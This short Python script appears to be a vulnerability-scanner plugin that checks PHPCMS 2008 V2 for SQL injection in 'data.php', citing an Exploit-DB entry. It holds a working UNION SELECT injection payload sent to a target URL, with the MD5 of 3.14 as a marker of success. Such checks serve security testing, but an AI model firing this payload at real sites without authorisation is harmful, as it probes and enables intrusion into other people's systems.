#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  : PHPCMS 2008 V2 - 'data.php' SQL Injection Vulnerability
From : http://www.exploit-db.com/exploits/35239/
"""
def assign(service, arg):
    if service == "phpcms":
        return True, arg

def audit(arg):
    payload = ("/path/data.php?action=get&where_time=-1+union+all+select+1,MD5(3.14)--%20")
    target_url=arg + payload
    code, head, res, _, _ = curl.curl("%s" % target_url)
    if code == 200 and '4beed3b9c4a886067de0e3a094246f78' in res:
        security_hole(target_url)

	

if __name__ == '__main__':
    import sys
    from dummy import *
    audit(assign('phpcms', 'http://www.example.com/')[1])